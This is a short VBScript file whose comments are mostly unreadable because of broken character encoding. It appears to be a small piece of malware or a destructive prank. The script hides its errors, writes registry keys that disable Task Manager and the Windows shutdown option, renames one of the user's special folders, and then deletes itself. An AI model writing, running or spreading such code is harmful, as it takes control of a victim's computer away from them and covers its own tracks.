'            = = = = = =  = > ��� ������ < = = = = = = = 

'      ���������� ����������(���� ����� �� ����������)
Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")


Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoClose", 1, "REG_DWORD"

' �������������� ����� ��� ��������� �� "���"
For Each Folder In Shell.SpecialFolders
If right(folder,13) = "��� ���������" Then 
Set tf = FileSystemObject.getfolder(folder): tf.name = "���"
End If
Next

'     �������������������
FileSystemObject.deletefile WScript.ScriptFullName, True

